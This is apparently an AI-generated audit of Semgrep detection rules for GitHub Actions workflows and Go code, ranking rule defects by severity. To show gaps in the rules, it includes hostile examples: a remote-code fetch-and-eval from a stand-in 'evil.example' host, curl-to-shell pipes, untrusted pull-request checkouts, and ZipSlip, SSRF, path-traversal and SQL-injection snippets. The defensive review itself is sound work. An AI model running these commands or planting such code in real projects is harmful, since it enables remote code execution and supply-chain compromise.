moon: asking kimi-k3...
# Audit findings, ranked by severity

## 1. CRITICAL (verify first) — `pull-request-target-code-checkout` + `workflow-run-target-code-checkout`: quoted `uses: "$ACTION"` and quoted `pattern-inside: "${{ ... }}"` may make both rules dead

**File:** `.semgrep/github-actions/pull-request-target-code-checkout.yaml`, `.semgrep/github-actions/workflow-run-target-code-checkout.yaml`

**Defect:** The pattern uses a double-quoted scalar *inside* the semgrep pattern: `uses: "$ACTION"`, and the `$EXPR` filter uses `pattern-inside: "${{ ... }}"`. Tree-sitter YAML distinguishes `plain_scalar` from `double_quote_scalar`; semgrep's YAML→generic mapping can map plain scalars to identifiers rather than string literals. Every real workflow writes `uses: actions/checkout@v4` **unquoted**. If the quoted pattern only matches double-quoted scalars, neither rule ever fires. Note the quotes-inside-pattern case is different from YAML-level quoting of the whole pattern (`- pattern: "run: $SHELL"` is fine — those quotes are stripped by the YAML parser and are not part of the pattern).

**DIRECTION:** FALSE NEGATIVES — the two highest-value supply-chain rules in the set would be silently dead.

**Repro / verification (30 seconds):**
```yaml
# /tmp/t.yml
on: pull_request_target
jobs:
  pwn:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```
```bash
semgrep scan --config .semgrep/github-actions/pull-request-target-code-checkout.yaml /tmp/t.yml
```
If no finding, change to `uses: $ACTION` (matching upstream) and drop quotes around `${{ ... }}`. **This must be tested, not assumed — `--strict` will never tell you.**

## 2. CRITICAL — `workflow-run-target-code-checkout`: missing `on:` shorthand forms

**Defect:** Only the map form is covered:
```yaml
- pattern-inside: |
    on:
      ...
      workflow_run: ...
      ...
```
The sibling `pull_request_target` rule has all three forms (map, `on: [..., pull_request_target, ...]`, `on: pull_request_target`). This one does not.

**DIRECTION:** FALSE NEGATIVES — `on: workflow_run` and `on: [workflow_run, push]` workflows are never scanned by this rule regardless of checkout behavior.

```yaml
on: [workflow_run]        # ← rule never fires
jobs:
  x:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.workflow_run.head_sha }}
```

## 3. HIGH — `path-traversal-inside-zip-extraction` (zip.yaml): hardcoded identifiers `reader` and `path`

**Defect:** `reader` and `path` are literal identifiers, not metavariables:
```
reader, $ERR := zip.OpenReader($ARCHIVE)
...
for _, $FILE := range reader.File {
  ...
  path := filepath.Join($TARGET, $FILE.Name)
```
Only code that names its reader `reader` and its join target `path` matches.

**DIRECTION:** FALSE NEGATIVES — dead rule for all real code:
```go
rc, _ := zip.OpenReader(f)          // "rc" ≠ "reader" → no match
for _, zf := range rc.File {
    dest := filepath.Join(outDir, zf.Name)  // "dest" ≠ "path" → no match
    io.Copy(out, mustOpen(zf))     // ZipSlip, gate stays green
}
```
Fix: `reader`→`$READER`, `path :=`→`$PATH :=` (or `... = filepath.Join(...)`).

## 4. HIGH — `go-unsafe-deserialization-interface`: misses `any`, misses Decoder APIs

**Defect (a):** `var $VAR interface{}` does not match `var $VAR any` (Go 1.18+ alias; confirmed known gap). For modern codebases this rule is mostly dead. **Defect (b):** `json.NewDecoder(r).Decode(&v)` / `yaml.NewDecoder(...)` are entirely uncovered — extremely common for streaming request bodies.

**DIRECTION:** FALSE NEGATIVES.
```go
var v any                                   // no match
json.NewDecoder(req.Body).Decode(&v)        // no match even with interface{}
```

## 5. HIGH — `run-shell-injection` + `github-script-injection`: blanket `&&` exclusions suppress genuinely dangerous interpolations

**Defect:** The `pattern-not: ${{ ... X && ... }}` exclusions assume "dangerous value left of `&&` ⇒ value never interpolated." That only holds if X appears *nowhere else* in the expression. Any expression where the tainted value is both a truthiness guard *and* emitted is suppressed.

**DIRECTION:** FALSE NEGATIVES.
```yaml
- run: echo "${{ github.head_ref && format('deploying {0}', github.head_ref) }}"
# head_ref IS interpolated (right side), but pattern-not "... github.head_ref && ..." matches → suppressed
```
Also: the exclusion set omits no `||` cases (correct — `A || 'x'` *does* interpolate A), which confirms the authors know the semantics; the `&&` case is only sound when X occurs exactly once. A sound version requires the dangerous var to appear only left of `&&`, which `pattern-not` cannot express per-occurrence. Severity is elevated because these two rules are the primary script-injection gate.

## 6. MEDIUM — `tainted-url-host`: `http.NewRequest` sink only matches string-literal methods; missing `NewRequestWithContext`

**Defect (a):** `http.NewRequest("$METHOD", $URL, ...)` requires a literal. The idiomatic form `http.NewRequest(http.MethodGet, tainted, nil)` never matches. The regex `^(GET|HEAD|POST|POSTFORM)$` also contains junk (`POSTFORM` is not an HTTP method; nobody writes `"POSTFORM"` as a method literal). **Defect (b):** `http.NewRequestWithContext(ctx, ...)` — the dominant form in real services — is absent. **Defect (c):** `$CLIENT.Do(req)` absent (partially mitigated by the NewRequest sink).

**DIRECTION:** FALSE NEGATIVES.
```go
req, _ := http.NewRequestWithContext(ctx, http.MethodGet, userURL, nil)  // SSRF, no finding
client.Do(req)
```

## 7. MEDIUM — `filepath-clean-misuse`: sanitizer `"/" + ...` blesses a still-exploitable idiom

**Defect:** Sanitizer `"/" + ...` matches *any* concatenation with a leading `"/"` literal. But `path.Clean("/" + req.URL.Path)` with `Path = "/../../etc/passwd"` yields `/etc/passwd` — absolute-path escape, still traversal. Only the `"/" + strings.Trim(p, "/")` form (the rule's own `fix:`) is safe.

**DIRECTION:** FALSE NEGATIVES — taint is killed at the sanitizer node, so `path.Clean("/" + tainted)` produces no finding despite being the classic Grafana-style traversal.
```go
p := path.Clean("/" + r.URL.Path)   // sanitized by "/" + ... → no finding; p == "/etc/passwd"
http.ServeFile(w, r, p)
```
Fix: tighten sanitizer to `"/" + strings.Trim(...)`.

## 8. MEDIUM — `tainted-sql-string`: `$VAR = "$SQLSTR"` kills the `+=` sink branch; unanchored SQL regex

**Defect (a):** `pattern-inside: $VAR = "$SQLSTR"; ...` uses `=`. Go code builds queries with `q := "SELECT ..."` or `var q = "SELECT ..."` (a var declaration with initializer — not an assignment statement). Neither matches `$VAR = "$SQLSTR"`, so the `$VAR += ...` sink branch only fires on the rare reassignment form. **Defect (b):** regex `(?i)(select|delete|insert|create|update|alter|drop).*` is unanchored and unbounded — matches those words anywhere.

**DIRECTION:** (a) FALSE NEGATIVES (near-dead branch); (b) FALSE POSITIVES (noise, e.g. `"selection criteria updated"`).
```go
q := "SELECT * FROM t WHERE id = "   // := form → branch dead → FN
q += r.URL.Query().Get("id")
db.Query(q)
```

## 9. MEDIUM — `shared-url-struct-mutation`: exclusion patterns use `=`, real code uses `:=`

**Defect:** `pattern-not-inside: ... = url.Parse(...)` (and the `ParseRequestURI` / `url.URL{...}` variants) use assignment `=`. Semgrep Go does not unify `:=` with `=`, and idiomatic code is `u, err := url.Parse(s)` (also a *tuple* LHS, which the leading `...` cannot bind as one target). The exclusions therefore don't apply to the overwhelmingly common shape.

**DIRECTION:** FALSE POSITIVES — the rule fires on mutation of *freshly parsed, locally owned* URLs, i.e. exactly the safe case it tries to exclude. FP floods are how gates get `--exclude`d or ignored, which converts to effective FN. (Note: direction is opposite to most findings here, but it is the correct one.)
```go
u, err := url.Parse(base)   // exclusion does not match (:=, tuple)
u.RawQuery = "debug=1"      // flagged — false positive
```

## 10. MEDIUM — `open-redirect` + `tainted-url-host`: `[a-zA-Z0-10]` in CLEAN node (the confirmed class, restated for completeness)

**Defect:** `.*//[a-zA-Z0-10]+\..*` — `0-10` parses as range `0-1` + literal `0`, i.e. `[01]`. A hardcoded safe URL whose host starts/contain digits 2–9 between `//` and the first `.` fails to be recognized as CLEAN.

**DIRECTION:** FALSE POSITIVES (CLEAN fails to match ⇒ safe hardcoded-host flows are flagged). Also note a secondary effect: unanchored regex means `https://cdn0.example.com` *is* treated as clean even though only the `0` matched — if that prefix were attacker-influenced it would be an FN, but with a hardcoded host it's FP-only. Fix: `[a-zA-Z0-9-]`.

## 11. LOW — `curl-eval`: only the `VAR=$(curl …); eval $VAR` shape; missing wget, quoting, direct form

**Defect:** `$DATA=<... curl ...>` requires an unquoted assignment whose RHS is exactly a curl substitution. Missed: `DATA="$(curl …)"` (quoted), `wget`, and `eval "$(curl …)"` with no intermediate variable.

**DIRECTION:** FALSE NEGATIVES.
```yaml
- run: eval "$(curl -s https://evil.example/x.sh)"   # no match
```

## 12. LOW — `gha-curl-pipe-shell`: interpreter allowlist too narrow

**Defect:** `^(bash|sh|python3?|ruby|perl)$` misses `zsh`, `dash`, `node`, `php`, and prefixed invocations (`sudo bash`, `env bash`, `bash -s` is fine but `/bin/bash` is not — `$CMD` binds the command word only).

**DIRECTION:** FALSE NEGATIVES.
```yaml
- run: curl -s https://x | sudo bash     # $CMD = sudo → regex fails → no match
- run: curl -s https://x | node          # no match
```

## 13. LOW — `allowed-unsecure-commands`: boolean/string form

**Defect:** `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` matches only the YAML boolean. `ACTIONS_ALLOW_UNSECURE_COMMANDS: "true"` (quoted string, functionally equivalent in Actions) is missed.

**DIRECTION:** FALSE NEGATIVES.

## 14. LOW — unanchored action regexes (both checkout rules + `github-script-injection`)

`regex: actions/checkout@.*` and `actions/github-script@.*` lack `^...$`. Matches `uses: evilcorp/actions/checkout@main`. **DIRECTION:** negligible FALSE POSITIVES; also would match `actions/checkout@v4/evil`-style junk. One-line fix.

## 15. LOW — `bad-tmp-file-creation` and `detect-shai-hulud-backdoor` coverage notes (not defects per se)

- `bad-tmp-file-creation` matches literal `"/tmp/..."` strings only; `filepath.Join(os.TempDir(), name)` (also `/tmp`) missed — FN, design-level.
- `detect-shai-hulud-backdoor` matches only exact standalone interpolations; `${{ github.event.discussion.title || 'x' }}`-wrapped variants inside the same run block won't match the exact-token generic patterns — FN, but the `paths: include` scoping to `discussion.yaml` is intentional and correct for the IoC.

---

## Audited, no semantic defect found

- `decompression_bomb.yaml` — pattern-inside anchoring and fix-regex arity are correct (`CopyN(dst, src, n)`; the `CopyBuffer` 3-arg case correctly drops the buffer via the `(\)|,.*\))` alternation).
- `raw-html-format.yaml` — generic `<$TAG ...` over format-string contents is sound; all four sink forms propagate taint correctly.
- `reverseproxy-director.yaml` — correct; minor unlisted nit: aliased import (`hp "net/http/httputil"`) breaks both the import anchor and `httputil.ReverseProxy` (FN, low).
- `gha-workflow-env-secret.yaml` — the `env:`-inside + `jobs:`-not-inside + regex conjunction correctly isolates workflow-level env (the only top-level context where `secrets.*` is legal anyway).
- `secrets-inherit.yaml` — correct.
- `zitrone-no-interpolation-in-run` (local) — FP-by-design is the stated policy; `generic_ellipsis_max_span` mitigation is sound; whole-pattern YAML quoting is not part of the pattern.

## Top three actions

1. **Run the repro in finding 1 today.** If the quoted `uses:` doesn't match plain scalars, your two `pull_request_target`/`workflow_run` gates are decorative.
2. Fix zip.yaml's literal identifiers — that rule is dead as shipped.
3. Revisit the `&&` exclusions in the two injection rules (finding 5) — they're a true suppression hole, not just noise.
